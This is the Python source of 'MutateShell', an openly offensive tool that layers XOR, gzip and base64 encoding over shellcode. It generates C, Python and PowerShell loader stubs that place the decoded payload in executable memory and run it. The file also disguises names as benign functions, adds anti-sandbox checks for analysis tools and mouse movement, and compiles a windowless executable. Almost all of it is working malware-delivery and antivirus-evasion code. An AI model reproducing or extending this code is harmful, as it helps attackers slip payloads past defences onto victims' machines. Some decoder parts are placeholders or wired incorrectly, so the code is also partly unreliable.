#!/usr/bin/env python3
"""
MutateShell - Advanced Shellcode Obfuscation Tool
A comprehensive tool for obfuscating shellcode and generating evasive payloads.
"""

import os
import sys
import base64
import gzip
import random
import string
import argparse
import subprocess
import hashlib
from pathlib import Path
from typing import List, Dict, Optional, Tuple
import json
import time
import urllib.request
import struct

class XOREncoder:
    """Multi-layer XOR encoding with random keys"""
    
    def __init__(self, layers: int = 1):
        self.layers = layers
        self.keys = []
        
    def generate_key(self, length: int = 16) -> bytes:
        """Generate random XOR key"""
        return bytes([random.randint(0, 255) for _ in range(length)])
    
    def encode(self, data: bytes) -> Tuple[bytes, List[bytes]]:
        """Apply multi-layer XOR encoding"""
        encoded = data
        keys = []
        
        for layer in range(self.layers):
            key = self.generate_key()
            keys.append(key)
            encoded = bytes(a ^ b for a, b in zip(encoded, key * (len(encoded) // len(key) + 1)))
        
        return encoded, keys
    
    def decode_stub(self, keys: List[bytes], language: str) -> str:
        """Generate decoder stub for the specified language"""
        if language == "c":
            return self._c_decode_stub(keys)
        elif language == "python":
            return self._python_decode_stub(keys)
        elif language == "powershell":
            return self._powershell_decode_stub(keys)
        else:
            raise ValueError(f"Unsupported language: {language}")
    
    def _c_decode_stub(self, keys: List[bytes]) -> str:
        """Generate C decoder stub"""
        stub = """
void decode_payload(unsigned char* encoded_data, size_t data_len) {
    unsigned char* decoded = malloc(data_len);
    memcpy(decoded, encoded_data, data_len);
    
"""
        for i, key in enumerate(keys):
            stub += f"    // XOR Layer {i+1}\n"
            stub += f"    unsigned char key{i}[] = {{"
            stub += ", ".join([f"0x{k:02x}" for k in key])
            stub += "};\n"
            stub += f"    for (size_t j = 0; j < data_len; j++) {{\n"
            stub += f"        decoded[j] ^= key{i}[j % {len(key)}];\n"
            stub += f"    }}\n\n"
        
        stub += "    // Execute the decoded payload\n"
        stub += "    void (*exec_func)() = (void(*)())decoded;\n"
        stub += "    exec_func();\n"
        stub += "    free(decoded);\n"
        stub += "}\n"
        
        return stub
    
    def _python_decode_stub(self, keys: List[bytes]) -> str:
        """Generate Python decoder stub"""
        stub = "def decode_payload(encoded_data):\n"
        stub += "    decoded = bytearray(encoded_data)\n\n"
        
        for i, key in enumerate(keys):
            stub += f"    # XOR Layer {i+1}\n"
            stub += f"    key{i} = {list(key)}\n"
            stub += f"    for j in range(len(decoded)):\n"
            stub += f"        decoded[j] ^= key{i}[j % {len(key)}]\n\n"
        
        stub += "    # Execute the decoded payload\n"
        stub += "    import ctypes\n"
        stub += "    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p\n"
        stub += "    addr = ctypes.windll.kernel32.VirtualAlloc(None, len(decoded), 0x3000, 0x40)\n"
        stub += "    ctypes.windll.kernel32.RtlMoveMemory(addr, decoded, len(decoded))\n"
        stub += "    ctypes.windll.kernel32.CreateThread(None, 0, addr, None, 0, None)\n"
        
        return stub
    
    def _powershell_decode_stub(self, keys: List[bytes]) -> str:
        """Generate PowerShell decoder stub"""
        stub = "function Decode-Payload {\n"
        stub += "    param([byte[]]$EncodedData)\n\n"
        stub += "    $decoded = [byte[]]$EncodedData.Clone()\n\n"
        
        for i, key in enumerate(keys):
            stub += f"    # XOR Layer {i+1}\n"
            stub += f"    $key{i} = @({', '.join([str(k) for k in key])})\n"
            stub += f"    for ($j = 0; $j -lt $decoded.Length; $j++) {{\n"
            stub += f"        $decoded[$j] = $decoded[$j] -bxor $key{i}[$j % {len(key)}]\n"
            stub += f"    }}\n\n"
        
        stub += "    # Execute the decoded payload\n"
        stub += "    $addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($decoded.Length)\n"
        stub += "    [System.Runtime.InteropServices.Marshal]::Copy($decoded, 0, $addr, $decoded.Length)\n"
        stub += "    $func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [System.Action])\n"
        stub += "    $func.Invoke()\n"
        stub += "}\n"
        
        return stub

class Base64Encoder:
    """Base64 encoding layer"""
    
    def encode(self, data: bytes) -> bytes:
        """Encode data with Base64"""
        return base64.b64encode(data)
    
    def decode_stub(self, language: str) -> str:
        """Generate Base64 decoder stub"""
        if language == "c":
            return """
#include <string.h>
unsigned char* base64_decode(const char* input, size_t* output_len) {
    // Simple base64 decoder implementation
    // In production, use a proper base64 library
    return NULL; // Placeholder
}
"""
        elif language == "python":
            return """
import base64
def decode_base64(encoded_data):
    return base64.b64decode(encoded_data)
"""
        elif language == "powershell":
            return """
function Decode-Base64 {
    param([string]$EncodedData)
    return [System.Convert]::FromBase64String($EncodedData)
}
"""
        else:
            raise ValueError(f"Unsupported language: {language}")

class GzipEncoder:
    """Gzip compression layer"""
    
    def encode(self, data: bytes) -> bytes:
        """Compress data with gzip"""
        return gzip.compress(data)
    
    def decode_stub(self, language: str) -> str:
        """Generate gzip decoder stub"""
        if language == "c":
            return """
#include <zlib.h>
unsigned char* gzip_decompress(const unsigned char* compressed, size_t compressed_len, size_t* decompressed_len) {
    // Use zlib for decompression
    return NULL; // Placeholder
}
"""
        elif language == "python":
            return """
import gzip
def decode_gzip(compressed_data):
    return gzip.decompress(compressed_data)
"""
        elif language == "powershell":
            return """
function Expand-Gzip {
    param([byte[]]$CompressedData)
    $stream = [System.IO.MemoryStream]::new($CompressedData)
    $gzip = [System.IO.Compression.GzipStream]::new($stream, [System.IO.Compression.CompressionMode]::Decompress)
    $output = [System.IO.MemoryStream]::new()
    $gzip.CopyTo($output)
    return $output.ToArray()
}
"""
        else:
            raise ValueError(f"Unsupported language: {language}")

class RenameEngine:
    """Function and variable name obfuscation"""
    
    def __init__(self):
        self.benign_names = [
            "update_buffer", "process_data", "initialize_system",
            "validate_input", "update_state", "process_message",
            "initialize_module", "validate_checksum", "update_cache",
            "process_request", "initialize_component", "validate_token"
        ]
        
        self.benign_vars = [
            "buffer", "data", "result", "temp", "cache",
            "message", "response", "status", "index", "count",
            "offset", "length", "size", "ptr", "addr"
        ]
    
    def get_random_name(self, name_type: str = "function") -> str:
        """Get random benign name"""
        if name_type == "function":
            return random.choice(self.benign_names)
        else:
            return random.choice(self.benign_vars)
    
    def obfuscate_stub(self, stub: str, language: str) -> str:
        """Obfuscate function and variable names in stub"""
        # Simple replacement - in production, use AST parsing
        replacements = {
            "decode_payload": self.get_random_name("function"),
            "encoded_data": self.get_random_name("variable"),
            "decoded": self.get_random_name("variable"),
            "data_len": self.get_random_name("variable"),
            "key": self.get_random_name("variable")
        }
        
        for old, new in replacements.items():
            stub = stub.replace(old, new)
        
        return stub

class StubGenerator:
    """Generate language-specific stubs"""
    
    def __init__(self):
        self.templates = {
            "c": self._c_template,
            "python": self._python_template,
            "powershell": self._powershell_template
        }
    
    def generate_stub(self, language: str, encoded_data: bytes, 
                     decoders: List[str], rename_engine: RenameEngine) -> str:
        """Generate complete stub with embedded payload"""
        
        if language not in self.templates:
            raise ValueError(f"Unsupported language: {language}")
        
        # Convert encoded data to appropriate format
        if language == "c":
            data_str = ", ".join([f"0x{b:02x}" for b in encoded_data])
        elif language == "python":
            data_str = str(list(encoded_data))
        elif language == "powershell":
            data_str = str(list(encoded_data))
        
        # Generate stub
        stub = self.templates[language](data_str, decoders)
        
        # Apply obfuscation if requested
        if rename_engine:
            stub = rename_engine.obfuscate_stub(stub, language)
        
        return stub
    
    def _c_template(self, data_str: str, decoders: List[str]) -> str:
        """C template"""
        template = """#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// Encoded payload
unsigned char encoded_payload[] = {PAYLOAD_DATA};
size_t payload_size = sizeof(encoded_payload);

// Decoder functions
DECODER_FUNCTIONS

int main() {
    // Decode and execute
    decode_payload(encoded_payload, payload_size);
    return 0;
}
"""
        return template.replace("PAYLOAD_DATA", data_str).replace("DECODER_FUNCTIONS", "\n".join(decoders))
    
    def _python_template(self, data_str: str, decoders: List[str]) -> str:
        """Python template"""
        template = """#!/usr/bin/env python3
import ctypes
import sys

# Encoded payload
encoded_payload = PAYLOAD_DATA

# Decoder functions
DECODER_FUNCTIONS

if __name__ == "__main__":
    # Decode and execute
    decode_payload(encoded_payload)
"""
        return template.replace("PAYLOAD_DATA", data_str).replace("DECODER_FUNCTIONS", "\n".join(decoders))
    
    def _powershell_template(self, data_str: str, decoders: List[str]) -> str:
        """PowerShell template"""
        template = """# Encoded payload
$encoded_payload = @(PAYLOAD_DATA)

# Decoder functions
DECODER_FUNCTIONS

# Execute
Decode-Payload -EncodedData $encoded_payload
"""
        return template.replace("PAYLOAD_DATA", data_str).replace("DECODER_FUNCTIONS", "\n".join(decoders))

class AntiSandbox:
    """Anti-sandbox and evasion techniques"""
    
    @staticmethod
    def generate_evasion_code(language: str) -> str:
        """Generate anti-sandbox code"""
        if language == "c":
            return """
// Anti-sandbox checks
#include <windows.h>
#include <tlhelp32.h>

int check_sandbox() {
    // Check for common sandbox processes
    const char* sandbox_processes[] = {"wireshark.exe", "procmon.exe", "processhacker.exe", NULL};
    for (int i = 0; sandbox_processes[i] != NULL; i++) {
        if (FindWindowA(NULL, sandbox_processes[i])) return 1;
    }
    
    // Check for mouse movement (user activity)
    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(1000);
    GetCursorPos(&p2);
    if (p1.x == p2.x && p1.y == p2.y) return 1;
    
    return 0;
}
"""
        elif language == "python":
            return """
import psutil
import time
import win32api

def check_sandbox():
    # Check for sandbox processes
    sandbox_processes = ["wireshark.exe", "procmon.exe", "processhacker.exe"]
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in sandbox_processes:
            return True
    
    # Check for mouse movement
    pos1 = win32api.GetCursorPos()
    time.sleep(1)
    pos2 = win32api.GetCursorPos()
    if pos1 == pos2:
        return True
    
    return False
"""
        elif language == "powershell":
            return """
function Test-Sandbox {
    # Check for sandbox processes
    $sandbox_processes = @("wireshark.exe", "procmon.exe", "processhacker.exe")
    $processes = Get-Process | Where-Object {$_.ProcessName -in $sandbox_processes}
    if ($processes) { return $true }
    
    # Check for mouse movement
    $pos1 = [System.Windows.Forms.Cursor]::Position
    Start-Sleep -Seconds 1
    $pos2 = [System.Windows.Forms.Cursor]::Position
    if ($pos1 -eq $pos2) { return $true }
    
    return $false
}
"""
        else:
            return ""

class Compiler:
    """Compile stubs to executables"""
    
    @staticmethod
    def compile_c_to_exe(c_file: str, output_file: str) -> bool:
        """Compile C file to executable"""
        try:
            cmd = ["gcc", "-o", output_file, c_file, "-static"]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            print(f"Compilation error: {e}")
            return False
    
    @staticmethod
    def compile_python_to_exe(py_file: str, output_file: str) -> bool:
        """Compile Python file to executable using PyInstaller"""
        try:
            cmd = ["pyinstaller", "--onefile", "--noconsole", py_file]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            print(f"PyInstaller error: {e}")
            return False

class MutateShell:
    """Main MutateShell class"""
    
    def __init__(self):
        self.xor_encoder = None
        self.base64_encoder = None
        self.gzip_encoder = None
        self.stub_generator = StubGenerator()
        self.rename_engine = RenameEngine()
        self.anti_sandbox = AntiSandbox()
        self.compiler = Compiler()
    
    def load_shellcode(self, input_path: str) -> bytes:
        """Load shellcode from various sources"""
        if input_path.startswith("msfvenom:"):
            # Handle msfvenom output
            return self._parse_msfvenom_output(input_path)
        elif input_path.startswith("hex:"):
            # Handle hex string
            hex_data = input_path[4:]
            return bytes.fromhex(hex_data)
        else:
            # Handle file
            with open(input_path, 'rb') as f:
                return f.read()
    
    def _parse_msfvenom_output(self, msfvenom_output: str) -> bytes:
        """Parse msfvenom output format"""
        # Extract hex bytes from msfvenom output
        lines = msfvenom_output.split('\n')
        hex_bytes = []
        
        for line in lines:
            if line.strip().startswith('\\x'):
                hex_bytes.extend(line.strip().split('\\x')[1:])
        
        return bytes.fromhex(''.join(hex_bytes))
    
    def obfuscate_payload(self, shellcode: bytes, xor_layers: int = 0,
                          use_base64: bool = False, use_gzip: bool = False) -> Tuple[bytes, List[str]]:
        """Apply obfuscation layers to payload"""
        encoded_data = shellcode
        decoders = []
        
        # Apply XOR encoding
        if xor_layers > 0:
            self.xor_encoder = XOREncoder(xor_layers)
            encoded_data, keys = self.xor_encoder.encode(encoded_data)
            decoders.append(self.xor_encoder.decode_stub(keys, "c"))
        
        # Apply gzip compression
        if use_gzip:
            self.gzip_encoder = GzipEncoder()
            encoded_data = self.gzip_encoder.encode(encoded_data)
            decoders.append(self.gzip_encoder.decode_stub("c"))
        
        # Apply Base64 encoding
        if use_base64:
            self.base64_encoder = Base64Encoder()
            encoded_data = self.base64_encoder.encode(encoded_data)
            decoders.append(self.base64_encoder.decode_stub("c"))
        
        return encoded_data, decoders
    
    def generate_stub(self, encoded_data: bytes, decoders: List[str], 
                     language: str, rename: bool = False, 
                     anti_sandbox: bool = False) -> str:
        """Generate complete stub with all features"""
        
        # Add anti-sandbox code if requested
        if anti_sandbox:
            decoders.append(self.anti_sandbox.generate_evasion_code(language))
        
        # Generate stub
        stub = self.stub_generator.generate_stub(
            language, encoded_data, decoders, 
            self.rename_engine if rename else None
        )
        
        return stub
    
    def save_output(self, stub: str, output_path: str, 
                   compile_exe: bool = False) -> bool:
        """Save output and optionally compile"""
        
        # Save stub file
        with open(output_path, 'w') as f:
            f.write(stub)
        
        # Compile if requested
        if compile_exe:
            if output_path.endswith('.c'):
                exe_path = output_path[:-2] + '.exe'
                return self.compiler.compile_c_to_exe(output_path, exe_path)
            elif output_path.endswith('.py'):
                return self.compiler.compile_python_to_exe(output_path, "")
        
        return True

def main():
    """Main CLI interface"""
    parser = argparse.ArgumentParser(
        description="MutateShell - Advanced Shellcode Obfuscation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python mutate.py --input shellcode.bin --xor 2 --stub c --output payload.c
  python mutate.py --input msfvenom:... --xor 3 --gzip --base64 --stub python --rename
  python mutate.py --input hex:9090... --stub powershell --anti-sandbox --compile
        """
    )
    
    parser.add_argument("--input", required=True, 
                       help="Input shellcode (file, msfvenom:output, or hex:data)")
    parser.add_argument("--xor", type=int, default=0, 
                       help="Number of XOR layers (1-3)")
    parser.add_argument("--gzip", action="store_true", 
                       help="Apply gzip compression")
    parser.add_argument("--base64", action="store_true", 
                       help="Apply Base64 encoding")
    parser.add_argument("--stub", choices=["c", "python", "powershell"], 
                       default="c", help="Output language")
    parser.add_argument("--rename", action="store_true", 
                       help="Obfuscate function/variable names")
    parser.add_argument("--anti-sandbox", action="store_true", 
                       help="Add anti-sandbox checks")
    parser.add_argument("--compile", action="store_true", 
                       help="Compile to executable")
    parser.add_argument("--output", required=True, 
                       help="Output file path")
    parser.add_argument("--test-av", action="store_true", 
                       help="Test against AV (placeholder)")
    
    args = parser.parse_args()
    
    # Initialize MutateShell
    mutator = MutateShell()
    
    try:
        # Load shellcode
        print(f"[+] Loading shellcode from: {args.input}")
        shellcode = mutator.load_shellcode(args.input)
        print(f"[+] Loaded {len(shellcode)} bytes")
        
        # Apply obfuscation
        print("[+] Applying obfuscation layers...")
        encoded_data, decoders = mutator.obfuscate_payload(
            shellcode, args.xor, args.base64, args.gzip
        )
        print(f"[+] Obfuscated to {len(encoded_data)} bytes")
        
        # Generate stub
        print(f"[+] Generating {args.stub} stub...")
        stub = mutator.generate_stub(
            encoded_data, decoders, args.stub, 
            args.rename, args.anti_sandbox
        )
        
        # Save output
        print(f"[+] Saving to: {args.output}")
        success = mutator.save_output(stub, args.output, args.compile)
        
        if success:
            print("[+] Successfully generated obfuscated payload!")
            if args.compile:
                print("[+] Executable compiled successfully")
        else:
            print("[-] Error generating payload")
            sys.exit(1)
        
        # AV testing placeholder
        if args.test_av:
            print("[!] AV testing not implemented yet")
        
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
